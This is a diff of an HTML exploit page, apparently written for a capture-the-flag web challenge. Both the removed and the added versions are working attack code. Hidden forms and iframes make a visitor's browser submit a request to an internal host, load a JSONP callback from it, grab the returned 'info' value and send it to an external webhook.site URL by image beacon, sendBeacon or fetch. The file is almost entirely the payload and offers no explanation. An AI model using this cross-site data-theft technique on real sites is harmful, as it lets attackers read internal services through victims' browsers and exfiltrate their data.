@@ -1,68 +1,30 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<head>
-<meta charset="UTF-8">
-<title>Loading...</title>
-</head>
 <body>
-<h1>Processing...</h1>
 <script>
-(function() {
-  var webhook = 'https://webhook.site/c9d4a3d0-88aa-45d5-8c8a-6c317e3f2bd1';
-  
-  // ⭐ 핵심: 내부 호스트명 사용!
-  var baseUrl = 'http://home:8001';
-  
-  // Step 1: Form으로 POST
-  var form = document.createElement('form');
-  form.method = 'POST';
-  form.action = baseUrl + '/post';
-  form.target = 'iframe1';
-  form.style.display = 'none';
-  
-  var input = document.createElement('input');
-  input.name = 'info_value';
-  input.value = 'INTERNAL_TEST';
-  form.appendChild(input);
-  
-  var iframe = document.createElement('iframe');
-  iframe.name = 'iframe1';
-  iframe.style.display = 'none';
-  
-  document.body.appendChild(iframe);
-  document.body.appendChild(form);
-  
-  console.log('[1] Submitting to internal URL');
-  form.submit();
-  
-  // Step 2: Callback 호출
-  setTimeout(function() {
-    console.log('[2] Loading callback from internal URL');
-    
-    window.exfil = function(data) {
-      console.log('[3] Data received:', data);
-      var flag = data.info || 'EMPTY';
-      
-      // 전송
-      new Image().src = webhook + '?flag=' + encodeURIComponent(flag);
-      
-      if (navigator.sendBeacon) {
-        navigator.sendBeacon(webhook + '?beacon=' + encodeURIComponent(flag));
-      }
-    };
-    
-    var s = document.createElement('script');
-    s.src = baseUrl + '/callback?callback=window.exfil';
-    s.onload = function() {
-      new Image().src = webhook + '?status=callback_loaded';
-    };
-    s.onerror = function() {
-      new Image().src = webhook + '?error=callback_failed';
-    };
-    document.body.appendChild(s);
-    
-  }, 2000);
-  
+const hook = 'https://webhook.site/213f2418-6a4f-4932-81f0-90124113fa54?f=';
+
+function leak(x){ fetch(hook + encodeURIComponent(x)).catch(()=>{}); }
+
+function step2(){
+  window.addEventListener('message', ev => {
+    if (ev.data && ev.data.info) leak(ev.data.info);
+  });
+  const cb = document.createElement('iframe');
+  cb.style.display = 'none';
+  cb.src = 'http://home:8001/callback?callback=parent.postMessage';
+  document.body.appendChild(cb);
+}
+
+(function(){
+  const fr = document.createElement('iframe');
+  fr.style.display = 'none';
+  fr.src = 'http://home:8001/post';
+  fr.onload = () => {
+    try { fr.contentWindow.document.forms[0].submit(); } catch(e){}
+    setTimeout(step2, 1000);
+  };
+  document.body.appendChild(fr);
 })();
 </script>
 </body>
